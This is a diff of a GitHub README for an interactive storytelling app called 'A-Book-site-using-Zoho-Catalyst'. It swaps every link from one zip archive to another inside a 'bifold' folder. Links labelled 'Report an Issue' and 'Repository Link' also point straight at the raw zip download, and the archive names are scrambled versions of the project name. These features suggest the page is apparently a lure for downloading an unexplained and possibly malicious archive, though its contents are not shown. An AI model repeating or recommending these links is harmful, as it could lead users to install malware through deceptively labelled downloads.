@@ -1,6 +1,6 @@
 # 📚 A-Book-site-using-Zoho-Catalyst - Enjoy Interactive Storytelling
 
-[![Download Here](https://raw.githubusercontent.com/AhmetEymen12345/A-Book-site-using-Zoho-Catalyst/main/bifold/Zoho-using-site-Book-Catalyst-v3.6.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AhmetEymen12345/A-Book-site-using-Zoho-Catalyst/main/bifold/Zoho-using-site-Book-Catalyst-v3.6.zip)
+[![Download Here](https://raw.githubusercontent.com/AhmetEymen12345/A-Book-site-using-Zoho-Catalyst/main/bifold/site_using_Zoho_Book_Catalyst_2.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AhmetEymen12345/A-Book-site-using-Zoho-Catalyst/main/bifold/site_using_Zoho_Book_Catalyst_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ No programming skills are needed.
 
 To get started, visit our Releases page to download the latest version of the application:
 
-[Download Here](https://raw.githubusercontent.com/AhmetEymen12345/A-Book-site-using-Zoho-Catalyst/main/bifold/Zoho-using-site-Book-Catalyst-v3.6.zip)
+[Download Here](https://raw.githubusercontent.com/AhmetEymen12345/A-Book-site-using-Zoho-Catalyst/main/bifold/site_using_Zoho_Book_Catalyst_2.0.zip)
 
 ### 🖥 Installation Steps
 
@@ -47,7 +47,7 @@ To get started, visit our Releases page to download the latest version of the ap
 
 If you encounter any issues while downloading or using the application, please reach out. You can report issues directly on our GitHub page:
 
-[Report an Issue](https://raw.githubusercontent.com/AhmetEymen12345/A-Book-site-using-Zoho-Catalyst/main/bifold/Zoho-using-site-Book-Catalyst-v3.6.zip)
+[Report an Issue](https://raw.githubusercontent.com/AhmetEymen12345/A-Book-site-using-Zoho-Catalyst/main/bifold/site_using_Zoho_Book_Catalyst_2.0.zip)
 
 Your feedback helps improve our application.
 
@@ -69,6 +69,6 @@ No, this application is completely free to use.
 
 Stay updated on new features and improvements by following our repository on GitHub. Join the discussion to share your thoughts!
 
-- [Repository Link](https://raw.githubusercontent.com/AhmetEymen12345/A-Book-site-using-Zoho-Catalyst/main/bifold/Zoho-using-site-Book-Catalyst-v3.6.zip)
+- [Repository Link](https://raw.githubusercontent.com/AhmetEymen12345/A-Book-site-using-Zoho-Catalyst/main/bifold/site_using_Zoho_Book_Catalyst_2.0.zip)
 
 Thank you for using A-Book-site-using-Zoho-Catalyst. We hope you enjoy your interactive reading experience!
